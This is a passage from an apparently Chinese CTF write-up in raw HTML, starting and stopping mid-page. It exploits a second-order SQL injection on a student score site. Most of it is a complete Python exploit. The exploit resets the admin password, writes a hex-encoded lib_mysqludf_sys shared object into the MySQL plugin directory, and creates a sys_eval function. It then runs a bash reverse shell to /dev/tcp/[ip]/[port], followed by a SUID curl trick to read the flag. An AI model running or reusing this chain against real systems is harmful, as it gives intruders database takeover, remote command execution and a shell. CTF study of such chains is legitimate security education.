dumpfile '</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>mysql<span class="token operator">/</span>plugin<span class="token operator">/</span>exp<span class="token punctuation">.</span>so'<span class="token punctuation">;</span><span class="token comment">#</span></code></pre><h4 id="创建udf-amp-命令执行"><a href="#创建udf-amp-命令执行" class="headerlink" title="创建udf &amp; 命令执行"></a>创建udf &amp; 命令执行</h4><p>两句话完成，还是利用score页面的二次注入</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 创建udf，这里默认会从plugin目录下找.so文件，创建一个用户自定义函数sys_eval</span><span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME '</span>exp<span class="token punctuation">.</span>so<span class="token string">';## 执行命令'</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>执行<code>echo &#39;/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#39;|sh</code></p><img src="/article/eruditeFlower/image-20221007121541949.png" class="" title="image-20221007121541949" loading="lazy"><h4 id="小提权"><a href="#小提权" class="headerlink" title="小提权"></a>小提权</h4><p>直接<code>cat /flag</code>没有权限，有个小提权在这里，不是很复杂，查找有suid的程序<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，可以看到curl有suid权限，且我们有curl的执行权限，因此执行<code>curl file:///flag</code>即可获得flag</p><img src="/article/eruditeFlower/image-20221007122036015.png" class="" title="image-20221007122036015" loading="lazy"><p>当然，也可以在页面上一句句执行，只不过有些复杂，但总归不可能直接就知道curl有suid权限，不可能直接curl读flag的，毕竟还是有个小考点一个小流程在这的</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: Err0r@Time: 3月 13, 2021"""</span><span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:20712"</span>CMD <span class="token operator">=</span> <span class="token string">"echo '/bin/bash -i >&amp; /dev/tcp/[ip]/[port] 0>&amp;1'|sh"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>COOKIES <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>HEADERS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'get'</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(url)</span>    data <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"params"</span><span class="token punctuation">)</span>    cookies<span class="token punctuation">.</span>update<span class="token punctuation">(</span>COOKIES<span class="token punctuation">)</span>    headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span>HEADERS<span class="token punctuation">)</span>    <span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            url<span class="token operator">=</span>url<span class="token punctuation">,</span>            data<span class="token operator">=</span>data<span class="token punctuation">,</span>            params<span class="token operator">=</span>params<span class="token punctuation">,</span>            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>            allow_redirects<span class="token operator">=</span>allow_redirects        <span class="token punctuation">)</span>    <span class="token keyword">elif</span> method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            url<span class="token operator">=</span>url<span class="token punctuation">,</span>            data<span class="token operator">=</span>data<span class="token punctuation">,</span>            params<span class="token operator">=</span>params<span class="token punctuation">,</span>            headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>            cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>            timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span>            allow_redirects<span class="token operator">=</span>allow_redirects        <span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        session<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># close session</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Requests method error.'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getRadmonStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reg</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/register.php"</span>    studentid <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> sql<span class="token punctuation">,</span>        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> studentid<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/login.php"</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/logout.php"</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">postAns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/index.php"</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"q1"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>        <span class="token string">"q2"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>        <span class="token string">"q3"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>        <span class="token comment"># "q6": "5"</span>        <span class="token string">"q4"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>        <span class="token string">"q5"</span><span class="token punctuation">:</span> <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span><span class="token keyword">def</span> <span class="token function">posScore</span><span class="token punctuation">(</span>studentid<span class="token punctuation">)</span><span class="token punctuation">:</span>    tarurl <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/score.php"</span>    params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"studentid"</span><span class="token punctuation">:</span> studentid<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>tarurl<span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">"post"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    passwd <span class="token operator">=</span> getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span>    poc <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment"># 这里可以利用特性直接select获取到admin密码，或者像这样直接修改admin密码</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">','</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">');update users set studentid='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">' where username='admin';\x23"</span></span><span class="token punctuation">,</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select 0x7F454C4602010100000000000000000003003E0001000000D00C0000000000004000000000000000E8180000000000000000000040003800050040001A00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050E57464040000006412000000000000641200000000000064120000000000009C000000000000009C00000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002B0000001500000005000000280000001E000000000000000000000006000000000000000C00000000000000070000002A00000009000000210000000000000000000000270000000B0000002200000018000000240000000E00000000000000040000001D0000001600000000000000130000000000000000000000120000002300000010000000250000001A0000000F000000000000000000000000000000000000001B00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000A00000011000000000000000000000000000000000000000D0000002600000017000000000000000800000000000000000000000000000000000000000000001F0000001C0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119C4C93DA4400398046883140000001600000017000000190000001B0000001D0000002000000022000000000000002300000000000000240000002500000027000000290000002A00000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED871581CC1E2F7DEA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF36AC68AE3B9FD4A0AC73D1C525681B320B5911FEAB5FBE120000000000000000000000000000000000000000000000000000000003000900A00B0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000E0000000120000000000000000000000DE01000000000000790100001200000000000000000000007700000000000000BA0000001200000000000000000000003504000000000000F5000000120000000000000000000000C2010000000000009E010000120000000000000000000000D900000000000000FB000000120000000000000000000000050000000000000016000000220000000000000000000000FE00000000000000CF000000120000000000000000000000AD00000000000000880100001200000000000000000000008000000000000000AB010000120000000000000000000000250100000000000010010000120000000000000000000000DC00000000000000C7000000120000000000000000000000C200000000000000B5000000120000000000000000000000CC02000000000000ED000000120000000000000000000000E802000000000000E70000001200000000000000000000009B00000000000000C200000012000000000000000000000028000000000000008001000012000B007A100000000000006E000000000000007500000012000B00A70D00000000000001000000000000001000000012000C00781100000000000000000000000000003F01000012000B001A100000000000002D000000000000001F01000012000900A00B0000000000000000000000000000C30100001000F1FF881720000000000000000000000000009600000012000B00AB0D00000000000001000000000000007001000012000B0066100000000000001400000000000000CF0100001000F1FF981720000000000000000000000000005600000012000B00A50D00000000000001000000000000000201000012000B002E0F0000000000002900000000000000A301000012000B00F71000000000000041000000000000003900000012000B00A40D00000000000001000000000000003201000012000B00EA0F0000000000003000000000000000BC0100001000F1FF881720000000000000000000000000006500000012000B00A60D00000000000001000000000000002501000012000B00800F0000000000006A000000000000008500000012000B00A80D00000000000003000000000000001701000012000B00570F00000000000029000000000000005501000012000B0047100000000000001F00000000000000A900000012000B00AC0D0000000000009A000000000000008F01000012000B00E8100000000000000F00000000000000D700000012000B00460E000000000000E800000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F6765745F6465696E6974007379735F657865635F6465696E6974007379735F6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C00666F726B00737973636F6E66006D6D6170007374726E6370790077616974706964007379735F6576616C006D616C6C6F6300706F70656E007265616C6C6F630066676574730070636C6F7365007379735F6576616C5F696E697400737472637079007379735F657865635F696E6974007379735F7365745F696E6974007379735F6765745F696E6974006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F657865630073797374656D007379735F73657400736574656E76007379735F7365745F6465696E69740066726565007379735F67657400676574656E76006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100B20100001000000000000000751A690900000200D401000000000000801720000000000008000000000000008017200000000000D01620000000000006000000020000000000000000000000D81620000000000006000000030000000000000000000000E016200000000000060000000A00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000A00000000000000000000003817200000000000070000000B00000000000000000000004017200000000000070000000C00000000000000000000004817200000000000070000000D00000000000000000000005017200000000000070000000E00000000000000000000005817200000000000070000000F00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883EC08E827010000E8C2010000E88D0500004883C408C3FF35320B2000FF25340B20000F1F4000FF25320B20006800000000E9E0FFFFFFFF252A0B20006801000000E9D0FFFFFFFF25220B20006802000000E9C0FFFFFFFF251A0B20006803000000E9B0FFFFFFFF25120B20006804000000E9A0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000 into dumpfile '/usr/lib64/mysql/plugin/exp.so';\x23"</span></span><span class="token punctuation">,</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'exp.so';\x23"</span></span><span class="token punctuation">,</span>        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select sys_eval(\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">\");\x23"</span></span>    <span class="token punctuation">]</span>    pocStudentId <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> poc<span class="token punctuation">:</span>        pocStudentId<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reg<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Ready to get admin"</span><span class="token punctuation">)</span>    login<span class="token punctuation">(</span>poc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pocStudentId<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    postAns<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*][?]set admin passwd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    logout<span class="token punctuation">(</span><span class="token punctuation">)</span>    loginRes <span class="token operator">=</span> login<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"something err0r"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes <span class="token keyword">and</span> <span class="token string">"错误"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]login as admin success!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"[-]login as admin fail!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]write out file"</span><span class="token punctuation">)</span>    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create function"</span><span class="token punctuation">)</span>    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token 